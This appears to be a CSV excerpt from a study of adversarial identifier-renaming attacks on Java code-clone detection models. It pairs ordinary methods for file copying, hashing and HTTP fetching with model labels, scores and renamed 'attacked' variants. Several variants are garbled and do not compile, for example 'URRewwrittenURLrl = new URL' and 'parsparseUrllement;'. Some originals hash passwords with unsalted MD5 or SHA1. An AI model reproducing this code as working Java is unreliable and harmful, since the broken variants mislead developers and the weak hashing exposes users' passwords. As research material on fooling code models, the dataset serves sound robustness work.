                Program.launch(Constants.HAWKSCOPE_URL_ROOT + ""issues/entry?comment="" + URLEncoder.encode(""Please paste the Hawkscope Error "" + ""Report here. It's currently copied to your "" + ""clipboard. Thank you for your support!"", Constants.ENCODING));
            } catch (final Exception e1) {
                Program.launch(Constants.HAWKSCOPE_URL_ROOT + ""issues/entry"");
            }
        }
        shell.dispose();
    }
 <SPLIT>     public void testReadPerMemberSixSmall() throws IOException {
        GZIPMembersInputStream gzin = new GZIPMembersInputStream(new ByteArrayInputStream(sixsmall_gz));
        gzin.setEofEachMember(true);
        for (int i = 0; i < 3; i++) {
            int count2 = IOUtils.copy(gzin, new NullOutputStream());
            assertEquals(""wrong 1-byte member count"", 1, count2);
            gzin.nextMember();
            int count3 = IOUtils.copy(gzin, new NullOutputStream());
            assertEquals(""wrong 5-byte member count"", 5, count3);
            gzin.nextMember();
        }
        int countEnd = IOUtils.copy(gzin, new NullOutputStream());
        assertEquals(""wrong eof count"", 0, countEnd);
    }
",182,,LABEL_1,LABEL_1,LABEL_1,-1,"uncaughtException,t,e,display,shell,message,e1",,,,0,,0,GA,2583,0.9294482549031575,failed,[]
369,"    @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        String rewrittenQueryString = URLDecoder.decode(request.getRequestURI(), ""UTF-8"").replaceFirst(""^.*?\\/(id:.*)\\/.*?$"", ""$1"");
        logger.debug(""rewrittenQueryString: "" + rewrittenQueryString);
        URL rewrittenUrl = new URL(fedoraUrl + rewrittenQueryString);
        logger.debug(""rewrittenUrl: "" + rewrittenUrl.getProtocol() + ""://"" + rewrittenUrl.getHost() + "":"" + rewrittenUrl.getPort() + rewrittenUrl.getFile());
        HttpURLConnection httpURLConnection = (HttpURLConnection) rewrittenUrl.openConnection();
        HttpURLConnection.setFollowRedirects(false);
        httpURLConnection.connect();
        response.setStatus(httpURLConnection.getResponseCode());
        logger.debug(""[status="" + httpURLConnection.getResponseCode() + ""]"");
        logger.debug(""[headers]"");
        for (Entry<String, List<String>> header : httpURLConnection.getHeaderFields().entrySet()) {
            if (header.getKey() != null) {
                for (String value : header.getValue()) {
                    if (value != null) {
                        logger.debug(header.getKey() + "": "" + value);
                        if (!header.getKey().equals(""Server"") && !header.getKey().equals(""Transfer-Encoding"")) {
                            response.addHeader(header.getKey(), value);
                        }
                    }
                }
            }
        }
        logger.debug(""[/headers]"");
        InputStream inputStream = httpURLConnection.getInputStream();
        OutputStream outputStream = response.getOutputStream();
        IOUtils.copy(inputStream, outputStream);
    }
 <SPLIT>     public static void copyFile(File from, File to) throws IOException {
        assert (from != null);
        assert (to != null);
        if (!to.exists()) {
            File parentDir = to.getParentFile();
            if (!parentDir.exists()) parentDir.mkdirs();
            to.createNewFile();
        }
        FileInputStream in = null;
        FileOutputStream out = null;
        try {
            in = new FileInputStream(from);
            try {
                out = new FileOutputStream(to);
                FileChannel ic = in.getChannel();
                try {
                    FileChannel oc = out.getChannel();
                    try {
                        oc.transferFrom(ic, 0, from.length());
                    } finally {
                        if (oc != null) {
                            oc.close();
                        }
                    }
                } finally {
                    if (ic != null) {
                        ic.close();
                    }
                }
            } finally {
                if (out != null) {
                    out.close();
                }
            }
        } finally {
            if (in != null) {
                in.close();
            }
        }
    }
",335,"    @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        String rewrittenqueryText = URLDecoder.decode(request.getRequestURI(), ""UTF-8"").replaceFirst(""^.*?\\/(id:.*)\\/.*?$"", ""$1"");
        logger.debug(""rewrittenQueryString: "" + rewrittenqueryText);
        URRewwrittenURLrl = new URL(fedoraUrl + rewrittenqueryText);
        logger.debug(""rewrittenUrl: "" + RewwrittenURL.getProtocol() + ""://"" + RewwrittenURL.getHost() + "":"" + RewwrittenURL.getPort() + RewwrittenURL.getFile());
        HttpURLConnection hwebSSLConn= (HttpURLConnection) RewwrittenURL.openConnection();
        HttpURLConnection.setFollowRedirects(false);
        webSSLConn.connect();
        response.setStatus(webSSLConn.getResponseCode());
        logger.debug(""[status="" + webSSLConn.getResponseCode() + ""]"");
        logger.debug(""[headers]"");
        for (Entry<String, List<Stheader header : webSSLConn.getHeaderFields().entrySet()) {
            if (header.getKey() != null) {
                for (String value : header.getValue()) {
                    if (value != null) {
                        logger.debug(header.getKey() + "": "" + value);
                        if (!header.getKey().equals(""Server"") && !header.getKey().equals(""Transfer-Encoding"")) {
                            response.addHeader(header.getKey(), value);
                        }
                    }
                }
            }
        }
        logger.debug(""[/headers]"");
        InputinputSteamtStream = webSSLConn.getInputStream();
        OutputStream outputFile = response.getOutputStream();
        IOUtils.copy(inputSteam, outputFile);
    }
",LABEL_1,LABEL_1,0.6090654134750366,1,"doGet,request,response,rewrittenQueryString,rewrittenUrl,httpURLConnection,header,value,inputStream,outputStream",,,,18,"doGet:doGet,request:request,response:response,rewrittenQueryString:rewrittenqueryText,rewrittenUrl:RewwrittenURL,httpURLConnection:webSSLConn,header:header,value:value,inputStream:inputSteam,outputStream:outputFile,",5,GA,688,0.25453656911849976,ga,[]
370,"    public static String encryptPassword(String password) {
        try {
            MessageDigest digest = java.security.MessageDigest.getInstance(""SHA1"");
            digest.update(password.getBytes(""UTF-8""));
            byte[] hash = digest.digest();
            StringBuffer buf = new StringBuffer();
            for (int i = 0; i < hash.length; i++) {
                int halfbyte = (hash[i] >>> 4) & 0x0F;
                int two_halfs = 0;
                do {
                    if ((0 <= halfbyte) && (halfbyte <= 9)) {
                        buf.append((char) ('0' + halfbyte));
                    } else {
                        buf.append((char) ('a' + (halfbyte - 10)));
                    }
                    halfbyte = hash[i] & 0x0F;
                } while (two_halfs++ < 1);
            }
            return buf.toString();
        } catch (Exception e) {
        }
        return null;
    }
 <SPLIT>     private void copyJar(File src, File dst) throws IOException {
        FileChannel srcChannel = null;
        FileChannel dstChannel = null;
        try {
            srcChannel = new FileInputStream(src).getChannel();
            dstChannel = new FileOutputStream(dst).getChannel();
            dstChannel.transferFrom(srcChannel, 0, srcChannel.size());
        } catch (IOException e) {
            fLog.log(Level.SEVERE, e.getMessage(), e);
        } finally {
            srcChannel.close();
            dstChannel.close();
        }
    }
",188,,LABEL_0,LABEL_0,LABEL_0,-1,"encryptPassword,password,digest,hash,buf,i,halfbyte,two_halfs",,,,0,,0,GA,2891,1.0338425238927205,failed,[]
371,"    public static String read(ClassLoader classLoader, String name, boolean all) throws IOException {
        if (all) {
            StringMaker sm = new StringMaker();
            Enumeration enu = classLoader.getResources(name);
            while (enu.hasMoreElements()) {
                URL url = (URL) enu.nextElement();
                InputStream is = url.openStream();
                String s = read(is);
                if (s != null) {
                    sm.append(s);
                    sm.append(StringPool.NEW_LINE);
                }
                is.close();
            }
            return sm.toString().trim();
        } else {
            InputStream is = classLoader.getResourceAsStream(name);
            String s = read(is);
            is.close();
            return s;
        }
    }
 <SPLIT>     @Test
    public void returnsEnclosedResponseOnUnsuccessfulException() throws Exception {
        Exception e = new UnsuccessfulResponseException(resp);
        expect(mockBackend.execute(host, req, ctx)).andThrow(e);
        replay(mockBackend);
        HttpResponse result = impl.execute(host, req, ctx);
        verify(mockBackend);
        assertSame(resp, result);
    }
",153,,LABEL_0,LABEL_0,LABEL_0,-1,"read,classLoader,name,all,sm,enu,url,is,s",,,,0,,0,GA,3327,1.1792179822921753,failed,[]
372,"    public static void copyFile(File in, File out) throws Exception {
        FileChannel sourceChannel = null;
        FileChannel destinationChannel = null;
        try {
            sourceChannel = new FileInputStream(in).getChannel();
            destinationChannel = new FileOutputStream(out).getChannel();
            sourceChannel.transferTo(0, sourceChannel.size(), destinationChannel);
        } finally {
            if (sourceChannel != null) sourceChannel.close();
            if (destinationChannel != null) destinationChannel.close();
        }
    }
 <SPLIT>     public void deleteAuthors() throws Exception {
        if (proposalIds.equals("""") || usrIds.equals("""")) throw new Exception(""No proposal or author selected."");
        String[] pids = proposalIds.split("","");
        String[] uids = usrIds.split("","");
        int pnum = pids.length;
        int unum = uids.length;
        if (pnum == 0 || unum == 0) throw new Exception(""No proposal or author selected."");
        int i, j;
        PreparedStatement prepStmt = null;
        try {
            con = database.getConnection();
            con.setAutoCommit(false);
            String pStr = ""delete from event where ACTION_ID='member added' AND PROPOSAL_ID=? AND SUBJECTUSR_ID=?"";
            prepStmt = con.prepareStatement(pStr);
            for (i = 0; i < pnum; i++) {
                for (j = 0; j < unum; j++) {
                    if (!uids[j].equals(userId)) {
                        prepStmt.setString(1, pids[i]);
                        prepStmt.setString(2, uids[j]);
                        prepStmt.executeUpdate();
                    }
                }
            }
            con.commit();
        } catch (Exception e) {
            if (!con.isClosed()) {
                con.rollback();
                prepStmt.close();
                con.close();
            }
            throw e;
        }
    }
",95,,LABEL_0,LABEL_0,LABEL_0,-1,"copyFile,in,out,sourceChannel,destinationChannel",,,,0,,0,GA,1909,0.6821123123168945,failed,[]
373,"    public static void main(final String args[]) {
        if (args.length < 2 || (args.length == 3 && !""-d"".equals(args[0]))) {
            System.out.println(""Usage: AdapterGenerator [Options] <PrologFile> <ClassPath>"");
            System.out.println(""       where the framework is the first element in the class path"");
            System.out.println(""Options: -d Enables the generation of debug output"");
            return;
        }
        boolean debug = args.length == 3;
        File prologFile = new File(debug ? args[1] : args[0]);
        if (!prologFile.isFile()) {
            System.out.println(""The given file does not exist."");
            return;
        }
        File targetFile = new File(prologFile.getParentFile(), prologFile.getName().substring(0, prologFile.getName().lastIndexOf(""."")) + "".jar"");
        String source;
        try {
            source = FileUtils.readFileToString(prologFile);
        } catch (IOException ex) {
            System.out.println(""Error reading file: "" + ex.getMessage());
            return;
        }
        Parser myParser = new PrologParserImpl();
        PrologProgram myProgram;
        try {
            myProgram = (PrologProgram) myParser.parse(source);
        } catch (Exception ex) {
            System.out.println(""Could not parse file: "" + ex.getMessage());
            return;
        }
        try {
            FactVisitor myVisitor = new FactVisitor();
            myVisitor.visit(myProgram);
            Map<String, TypeGenerationInfo> adapterLayer = myVisitor.getAdapterLayer();
            if (adapterLayer.size() == 0) {
                System.out.println(""No adapters to generate, "" + ""did you forget to run the comeback rules?"");
                return;
            }
            URLClassLoader classLoader = createClassLoaderFromClassPath(debug ? args[2] : args[1]);
            ClassWriter adapterWriter = new ClassWriter(new JarEntryWriter(targetFile));
            AdapterAnnotationGenerator annotationGenerator = new AdapterAnnotationGenerator();
            Type annotationType = Type.getObjectType(""net/sourceforge/comeback/Adapter"");
            adapterWriter.writeClass(annotationType.getClassName(), annotationGenerator.createAnnotation(annotationType));
            AdapterLookupGenerator lookupWriter = new AdapterLookupGenerator(Type.getObjectType(""net/sourceforge/comeback/Adapters""), annotationType);
            GenerationContext context = new GenerationContext(adapterLayer, classLoader, annotationType, lookupWriter, adapterWriter);
            context.setGenerateDebugOutput(debug);
            Iterator<TypeGenerationInfo> iterator = adapterLayer.values().iterator();
            while (iterator.hasNext()) {
                TypeGenerationInfo info = iterator.next();
                context.generateAdapter(info);
            }
            ByteArrayOutputStream serialized = new ByteArrayOutputStream();
            ObjectOutputStream out = new ObjectOutputStream(serialized);
            out.writeObject(adapterLayer);
            out.close();
            adapterWriter.writeResource(""net/sourceforge/comeback/adapterlayer.ser"", serialized.toByteArray());
            String[] sharedClassesPrefixes = new String[2];
            Assembler assembler = new Assembler(adapterWriter);
            PatternClassFilter filter = new PatternClassFilter();
            URL url = Main.class.getResource(""/"" + Main.class.getName().replace('.', '/') + "".class"");
            JarURLConnection connection = (JarURLConnection) url.openConnection();
            sharedClassesPrefixes[0] = assembler.assemble(connection.getJarFile(), filter);
            filter = new PatternClassFilter();
            url = Type.class.getResource(""/"" + Type.class.getName().replace('.', '/') + "".class"");
            connection = (JarURLConnection) url.openConnection();
            sharedClassesPrefixes[1] = assembler.assemble(connection.getJarFile(), filter);
            String tmp = debug ? args[2] : args[1];
            adapterWriter.writeClass(lookupWriter.getType().getClassName(), lookupWriter.createAdapterLookup(adapterLayer.values(), tmp.substring(tmp.lastIndexOf(File.pathSeparator) + 1), sharedClassesPrefixes));
            adapterWriter.close();
        } catch (Throwable e) {
            e.printStackTrace();
            return;
        }
    }
 <SPLIT>     public static String getHashedPassword(String password) {
        try {
            MessageDigest digest = MessageDigest.getInstance(""MD5"");
            digest.update(password.getBytes());
            BigInteger hashedInt = new BigInteger(1, digest.digest());
            return String.format(""%1$032X"", hashedInt);
        } catch (NoSuchAlgorithmException nsae) {
            System.err.println(nsae.getMessage());
        }
        return """";
    }
",764,,LABEL_0,LABEL_1,,-4,"debug,prologFile,targetFile,source,myParser,myProgram,myVisitor,adapterLayer,classLoader,adapterWriter,annotationGenerator,out",,,,0,,0,Greedy,1,0.0008021314938863118,,[]
374,"    protected String getFileContentAsString(String filePath, String encoding) throws IOException {
        URL testURL = Thread.currentThread().getContextClassLoader().getResource(filePath);
        InputStream input = null;
        StringWriter sw = new StringWriter();
        try {
            if (testURL != null) {
                input = testURL.openStream();
            } else {
                input = new FileInputStream(filePath);
            }
            IOUtils.copy(input, sw, encoding);
        } finally {
            if (input != null) {
                input.close();
            }
        }
        return sw.toString();
    }
 <SPLIT>     private void createButtonCopyToClipboard() {
        buttonCopyToClipboard = new Button(shell, SWT.PUSH);
        buttonCopyToClipboard.setText(""Co&py to Clipboard"");
        buttonCopyToClipboard.setLayoutData(SharedStyle.relativeToBottomRight(buttonClose));
        buttonCopyToClipboard.addSelectionListener(new SelectionAdapter() {

            @Override
            public void widgetSelected(final SelectionEvent event) {
                IOUtils.copyToClipboard(Version.getEnvironmentReport());
            }
        });
    }
",111,,LABEL_1,LABEL_1,LABEL_1,-1,"getFileContentAsString,filePath,encoding,testURL,input,sw",,,,0,,0,GA,2181,0.7701847553253174,failed,[]
375,"    public static void fileCopy(String from_name, String to_name) throws IOException {
        File fromFile = new File(from_name);
        File toFile = new File(to_name);
        if (fromFile.equals(toFile)) abort(""cannot copy on itself: "" + from_name);
        if (!fromFile.exists()) abort(""no such currentSourcepartName file: "" + from_name);
        if (!fromFile.isFile()) abort(""can't copy directory: "" + from_name);
        if (!fromFile.canRead()) abort(""currentSourcepartName file is unreadable: "" + from_name);
        if (toFile.isDirectory()) toFile = new File(toFile, fromFile.getName());
        if (toFile.exists()) {
            if (!toFile.canWrite()) abort(""destination file is unwriteable: "" + to_name);
        } else {
            String parent = toFile.getParent();
            if (parent == null) abort(""destination directory doesn't exist: "" + parent);
            File dir = new File(parent);
            if (!dir.exists()) abort(""destination directory doesn't exist: "" + parent);
            if (dir.isFile()) abort(""destination is not a directory: "" + parent);
            if (!dir.canWrite()) abort(""destination directory is unwriteable: "" + parent);
        }
        FileInputStream from = null;
        FileOutputStream to = null;
        try {
            from = new FileInputStream(fromFile);
            to = new FileOutputStream(toFile);
            byte[] buffer = new byte[4096];
            int bytes_read;
            while ((bytes_read = from.read(buffer)) != -1) to.write(buffer, 0, bytes_read);
        } finally {
            if (from != null) try {
                from.close();
            } catch (IOException e) {
                ;
            }
            if (to != null) try {
                to.close();
            } catch (IOException e) {
                ;
            }
        }
    }
 <SPLIT>     public static void copyTo(File source, File dest) {
        if (source.isHidden()) ; else if (source.isDirectory()) {
            File temp = new File(dest.getPath() + ""/"" + source.getName());
            temp.mkdir();
            for (File sel : source.listFiles()) copyTo(sel, temp);
        } else {
            try {
                File tempDest = new File(dest.getPath() + ""/"" + source.getName());
                tempDest.createNewFile();
                FileChannel sourceCh = new FileInputStream(source).getChannel();
                FileChannel destCh = new FileOutputStream(tempDest).getChannel();
                sourceCh.transferTo(0, sourceCh.size(), destCh);
                sourceCh.close();
                destCh.close();
            } catch (IOException ex) {
                Logger.getLogger(EditorUtil.class.getName()).log(Level.SEVERE, null, ex);
            }
        }
    }
",364,"    public static void folderUpload(String fromqName, String To_name) throws IOException {
        File FromDir = new File(fromqName);
        File fromDirectory = new File(To_name);
        if (FromDir.equals(fromDirectory)) abort(""cannot copy on itself: "" + fromqName);
        if (!FromDir.exists()) abort(""no such currentSourcepartName file: "" + fromqName);
        if (!FromDir.isFile()) abort(""can't copy directory: "" + fromqName);
        if (!FromDir.canRead()) abort(""currentSourcepartName file is unreadable: "" + fromqName);
        if fromDirectorye.isDirectory())fromDirectorye = new FilefromDirectorye, FromDir.getName());
        if (fromDirectory.exists()) {
            if (!fromDirectory.canWrite()) abort(""destination file is unwriteable: "" + To_name);
        } else {
            String parent ptDirectory.getParent();
            if (pt == null) abort(""destination directory doesn't exist: "" + pt);
            Furl dir = new File(pt);
            iurl!dir.exists()) abort(""destination directory doesn't exist: "" + pt);
            url(dir.isFile()) abort(""destination is not a directory: "" + pt);
            iurl!dir.canWrite()) abort(""destination directory is unwriteable: "" + pt);
        }
        FileInputStream user = null;
        FileOutputStream po = null;
        try {
           userm = new FileInputStream(FromDir);
            to = nepoFileOutputStream(fromDirectory);
            byte[] resource = new byte[4096];
            int bytes_available;
            while ((bytebytes_availableser.read(resource)) != -1) po.write(resource, 0, bytes_available);
        } finally {
            if (user != null) try {
                user.close();
            } catch (IOException e) {
                ;
            }
            if (po != null) try {
                po.close();
            } catch (IOException e) {
                ;
            }
        }
    }
",LABEL_1,LABEL_1,0.5560118556022644,1,"fileCopy,from_name,to_name,fromFile,toFile,parent,dir,from,to,buffer,bytes_read",,,,0,"fileCopy:folderUpload,from_name:fromqName,to_name:To_name,fromFile:FromDir,toFile:fromDirectory,parent:pt,dir:url,from:user,to:po,buffer:resource,bytes_read:bytes_available,",0,GA,1100,0.40942655007044476,ga,[]
376,"    public static String md5Hash(String src) {
        try {
            MessageDigest md = MessageDigest.getInstance(""MD5"");
            md.update(src.getBytes());
            return bytesArrayToHexString(md.digest());
        } catch (Exception e) {
            return null;
        }
    }
 <SPLIT>     private String digest(String input) throws NoSuchAlgorithmException, UnsupportedEncodingException {
        MessageDigest md = MessageDigest.getInstance(""MD5"");
        byte[] md5hash = new byte[64];
        md.update(input.getBytes(""iso-8859-1""), 0, input.length());
        md5hash = md.digest();
        return this.convertToHex(md5hash);
    }
",57,,LABEL_1,LABEL_1,LABEL_1,-1,"md5Hash,src,md",,,,0,,0,GA,1163,0.4058661142985026,failed,[]
377,"    public static boolean encodeFileToFile(String infile, String outfile) {
        boolean success = false;
        java.io.InputStream in = null;
        java.io.OutputStream out = null;
        try {
            in = new Base64.InputStream(new java.io.BufferedInputStream(new java.io.FileInputStream(infile)), Base64.ENCODE);
            out = new java.io.BufferedOutputStream(new java.io.FileOutputStream(outfile));
            byte[] buffer = new byte[65536];
            int read = -1;
            while ((read = in.read(buffer)) >= 0) {
                out.write(buffer, 0, read);
            }
            success = true;
        } catch (java.io.IOException exc) {
            exc.printStackTrace();
        } finally {
            try {
                in.close();
            } catch (Exception exc) {
            }
            try {
                out.close();
            } catch (Exception exc) {
            }
        }
        return success;
    }
 <SPLIT>     public String getData(DefaultHttpClient httpclient) {
        try {
            HttpGet get = new HttpGet(""http://3dforandroid.appspot.com/api/v1/note"");
            get.setHeader(""Content-Type"", ""application/json"");
            get.setHeader(""Accept"", ""*/*"");
            HttpResponse response = httpclient.execute(get);
            HttpEntity entity = response.getEntity();
            InputStream instream = entity.getContent();
            responseMessage = read(instream);
            if (instream != null) instream.close();
        } catch (ClientProtocolException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
        return responseMessage;
    }
",194,,LABEL_0,LABEL_0,LABEL_0,-1,"encodeFileToFile,infile,outfile,in,out,buffer,read,success",,,,0,,0,GA,2993,1.0724085132280985,failed,[]
378,"    protected void innerProcess(ProcessorURI curi) throws InterruptedException {
        Pattern regexpr = curi.get(this, STRIP_REG_EXPR);
        ReplayCharSequence cs = null;
        try {
            cs = curi.getRecorder().getReplayCharSequence();
        } catch (Exception e) {
            curi.getNonFatalFailures().add(e);
            logger.warning(""Failed get of replay char sequence "" + curi.toString() + "" "" + e.getMessage() + "" "" + Thread.currentThread().getName());
            return;
        }
        MessageDigest digest = null;
        try {
            try {
                digest = MessageDigest.getInstance(SHA1);
            } catch (NoSuchAlgorithmException e1) {
                e1.printStackTrace();
                return;
            }
            digest.reset();
            String s = null;
            if (regexpr != null) {
                s = cs.toString();
            } else {
                Matcher m = regexpr.matcher(cs);
                s = m.replaceAll("" "");
            }
            digest.update(s.getBytes());
            byte[] newDigestValue = digest.digest();
            curi.setContentDigest(SHA1, newDigestValue);
        } finally {
            if (cs != null) {
                try {
                    cs.close();
                } catch (IOException ioe) {
                    logger.warning(TextUtils.exceptionToString(""Failed close of ReplayCharSequence."", ioe));
                }
            }
        }
    }
 <SPLIT>     private static String scramble(String text) {
        try {
            MessageDigest md = MessageDigest.getInstance(""SHA-1"");
            md.update(text.getBytes(""UTF-8""));
            StringBuffer sb = new StringBuffer();
            for (byte b : md.digest()) sb.append(Integer.toString(b & 0xFF, 16));
            return sb.toString();
        } catch (UnsupportedEncodingException e) {
            return null;
        } catch (NoSuchAlgorithmException e) {
            return null;
        }
    }
",264,,LABEL_1,LABEL_1,LABEL_1,-1,"innerProcess,curi,regexpr,cs,digest,s,m,newDigestValue",,,,0,,0,GA,2822,1.025300153096517,failed,[]
379,"    public Resource parse(URL url, IRDFContainer target) throws RDFException, IOException {
        parseURL = url;
        URLConnection connection = url.openConnection();
        if (charset == null) {
            charset = Charset.forName(""UTF-8"");
        }
        Reader reader = new InputStreamReader(connection.getInputStream(), charset);
        return internalParse(reader, target);
    }
 <SPLIT>     @Override
    public String transformSingleFile(X3DEditorSupport.X3dEditor xed) {
        Node[] node = xed.getActivatedNodes();
        X3DDataObject dob = (X3DDataObject) xed.getX3dEditorSupport().getDataObject();
        FileObject mySrc = dob.getPrimaryFile();
        File mySrcF = FileUtil.toFile(mySrc);
        File myOutF = new File(mySrcF.getParentFile(), mySrc.getName() + "".x3dv.gz"");
        TransformListener co = TransformListener.getInstance();
        co.message(NbBundle.getMessage(getClass(), ""Gzip_compression_starting""));
        co.message(NbBundle.getMessage(getClass(), ""Saving_as_"") + myOutF.getAbsolutePath());
        co.moveToFront();
        co.setNode(node[0]);
        try {
            String x3dvFile = ExportClassicVRMLAction.instance.transformSingleFile(xed);
            FileInputStream fis = new FileInputStream(new File(x3dvFile));
            GZIPOutputStream gzos = new GZIPOutputStream(new FileOutputStream(myOutF));
            byte[] buf = new byte[4096];
            int ret;
            while ((ret = fis.read(buf)) > 0) gzos.write(buf, 0, ret);
            gzos.close();
        } catch (Exception ex) {
            co.message(NbBundle.getMessage(getClass(), ""Exception:__"") + ex.getLocalizedMessage());
            return null;
        }
        co.message(NbBundle.getMessage(getClass(), ""Gzip_compression_complete""));
        return myOutF.getAbsolutePath();
    }
",72,"    public Resource parse(URL element, IRDFContainer output) throws RDFException, IOException {
        parsparseUrllement;
        URLConnection conntextlement.openConnection();
        if (ChARSec == null) {
            ChARSec = Charset.forName(""UTF-8"");
        }
        Rreadingreader = new InputStreamReader(text.getInputStream(), ChARSec);
        return internalParse(reading, output);
    }
",LABEL_0,LABEL_0,0.657297670841217,1,"parse,url,target,parseURL,connection,charset,reader",,,,1,"parse:parse,url:element,target:output,parseURL:parseUrl,connection:text,charset:ChARSec,reader:reading,",1,GA,377,0.13660795291264852,ga,[]
380,"    public void serialize(OutputStream out) throws IOException, BadIMSCPException {
        ensureParsed();
        ZipFilePackageParser parser = utils.getIMSCPParserFactory().createParser();
        parser.setContentPackage(cp);
        if (on_disk != null) on_disk.delete();
        on_disk = createTemporaryFile();
        parser.serialize(on_disk);
        InputStream in = new FileInputStream(on_disk);
        IOUtils.copy(in, out);
    }
 <SPLIT>     public String transformByMD5(String password) throws XSServiceException {
        MessageDigest md5;
        byte[] output;
        StringBuffer bufferPass;
        try {
            md5 = MessageDigest.getInstance(""MD5"");
        } catch (NoSuchAlgorithmException e) {
            logger.warn(""DataAccessException thrown while getting MD5 algorithm:"" + e.getMessage(), e);
            throw new XSServiceException(""Database error while saving user"");
        }
        md5.reset();
        md5.update(password.getBytes());
        output = md5.digest();
        bufferPass = new StringBuffer();
        for (byte b : output) {
            bufferPass.append(Integer.toHexString(0xff & b).length() == 1 ? ""0"" + Integer.toHexString(0xff & b) : Integer.toHexString(0xff & b));
        }
        return bufferPass.toString();
    }
",81,,LABEL_0,LABEL_0,LABEL_0,-1,"serialize,out,parser,on_disk,in",,,,0,,0,GA,1873,0.6626763582229614,failed,[]
381,"    private void unJarStart(String jarPath, String jarEntryStart) {
        String path;
        if (jarPath.lastIndexOf(""lib/"") >= 0) path = jarPath.substring(0, jarPath.lastIndexOf(""lib/"")); else path = jarPath.substring(0, jarPath.lastIndexOf(""/""));
        String relPath = jarEntryStart.substring(0, jarEntryStart.lastIndexOf(""/""));
        try {
            new File(path + ""/"" + relPath).mkdirs();
            JarFile jar = new JarFile(jarPath);
            Enumeration<JarEntry> entries = jar.entries();
            while (entries.hasMoreElements()) {
                JarEntry entry = entries.nextElement();
                String jarEntry = entry.getName();
                if (jarEntry.startsWith(jarEntryStart)) {
                    ZipEntry ze = jar.getEntry(jarEntry);
                    File bin = new File(path + ""/"" + jarEntry);
                    IOUtils.copy(jar.getInputStream(ze), new FileOutputStream(bin));
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
 <SPLIT>     public void resolvePlugins() {
        try {
            File cacheDir = XPontusConfigurationConstantsIF.XPONTUS_CACHE_DIR;
            File pluginsFile = new File(cacheDir, ""plugins.xml"");
            if (!pluginsFile.exists()) {
                URL pluginURL = new URL(""http://xpontus.sourceforge.net/snapshot/plugins.xml"");
                InputStream is = pluginURL.openStream();
                OutputStream os = FileUtils.openOutputStream(pluginsFile);
                IOUtils.copy(is, os);
                IOUtils.closeQuietly(os);
                IOUtils.closeQuietly(is);
            }
            resolvePlugins(pluginsFile.getAbsolutePath());
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
",220,,LABEL_1,LABEL_1,LABEL_1,-1,"unJarStart,jarPath,jarEntryStart,path,relPath,jar,entries,entry,jarEntry,ze,bin",,,,0,,0,GA,3907,1.409845232963562,failed,[]
382,"    public static String md5(String data) {
        try {
            MessageDigest md = MessageDigest.getInstance(MD);
            md.update(data.getBytes(UTF8));
            return encodeHex(md.digest());
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }
 <SPLIT>     public static String MD5(String text) throws NoSuchAlgorithmException, UnsupportedEncodingException {
        MessageDigest md;
        md = MessageDigest.getInstance(""MD5"");
        byte[] md5hash = new byte[32];
        md.update(text.getBytes(""iso-8859-1""), 0, text.length());
        md5hash = md.digest();
        return convertToHex(md5hash);
    }
",60,,LABEL_1,LABEL_1,LABEL_1,-1,"md5,data,md",,,,0,,0,GA,1162,0.40572528839111327,failed,[]
383,"    private static boolean genCustRatingFileAndMovieIndexFile(String completePath, String masterFile, String CustRatingFileName, String MovieIndexFileName) {
        try {
            File inFile = new File(completePath + fSep + ""SmartGRAPE"" + fSep + masterFile);
            FileChannel inC = new FileInputStream(inFile).getChannel();
            File outFile1 = new File(completePath + fSep + ""SmartGRAPE"" + fSep + MovieIndexFileName);
            FileChannel outC1 = new FileOutputStream(outFile1, true).getChannel();
            File outFile2 = new File(completePath + fSep + ""SmartGRAPE"" + fSep + CustRatingFileName);
            FileChannel outC2 = new FileOutputStream(outFile2, true).getChannel();
            int fileSize = (int) inC.size();
            int totalNoDataRows = fileSize / 7;
            ByteBuffer mappedBuffer = inC.map(FileChannel.MapMode.READ_ONLY, 0, fileSize);
            int startIndex = 1, count = 0;
            short currentMovie = 1;
            while (mappedBuffer.hasRemaining()) {
                count++;
                short movieName = mappedBuffer.getShort();
                int customer = mappedBuffer.getInt();
                byte rating = mappedBuffer.get();
                if (movieName != currentMovie) {
                    ByteBuffer outBuf1 = ByteBuffer.allocate(10);
                    outBuf1.putShort(currentMovie);
                    outBuf1.putInt(startIndex);
                    outBuf1.putInt(count - 1);
                    outBuf1.flip();
                    outC1.write(outBuf1);
                    currentMovie = movieName;
                    startIndex = count;
                }
                ByteBuffer outBuf2 = ByteBuffer.allocate(5);
                outBuf2.putInt(customer);
                outBuf2.put(rating);
                outBuf2.flip();
                outC2.write(outBuf2);
            }
            ByteBuffer endOfIndexFile = ByteBuffer.allocate(10);
            endOfIndexFile.putShort(currentMovie);
            endOfIndexFile.putInt(startIndex);
            endOfIndexFile.putInt(100480506);
            endOfIndexFile.flip();
            outC1.write(endOfIndexFile);
            outC1.close();
            outC2.close();
            return true;
        } catch (IOException e) {
            System.err.println(e);
            return false;
        }
    }
 <SPLIT>     public ActionForward execute(ActionMapping mapping, ActionForm form, HttpServletRequest request, HttpServletResponse response) throws Exception {
        InstanciaDelegate delegate = RegistroManager.recuperarInstancia(request);
        if (delegate == null) {
            ActionErrors errors = new ActionErrors();
            errors.add(null, new ActionError(""errors.session""));
            saveErrors(request, errors);
            return mapping.findForward(""fail"");
        }
        AyudaPantalla ayudaPantalla = delegate.obtenerAyudaPantalla();
        TraAyudaPantalla traAyudaPantalla = (TraAyudaPantalla) ayudaPantalla.getTraduccion();
        String urlSonido = traAyudaPantalla.getUrlSonido();
        if (urlSonido == null) {
            return null;
        }
        URL url = new URL(urlSonido);
        URLConnection urlConnection = url.openConnection();
        urlConnection.connect();
        String tipoMime = urlConnection.getContentType();
        log.debug(""Tipo Mime: "" + tipoMime);
        Map audioOptions = new HashMap();
        if (tipoMime.indexOf(""audio"") != -1 || tipoMime.indexOf(""asf"") != -1 || tipoMime.equals(""unknown/unknown"")) {
            audioOptions.put(""id"", ""MediaPlayer"");
            audioOptions.put(""codeBase"", ""http://activex.microsoft.com/activex/controls/mplayer/en/nsmp2inf.cab#Version=6,4,7,1112"");
            audioOptions.put(""classId"", ""CLSID:22D6F312-B0F6-11D0-94AB-0080C74C7E95"");
            audioOptions.put(""mimeType"", ""application/x-mplayer2"");
            audioOptions.put(""urlSonido"", urlSonido);
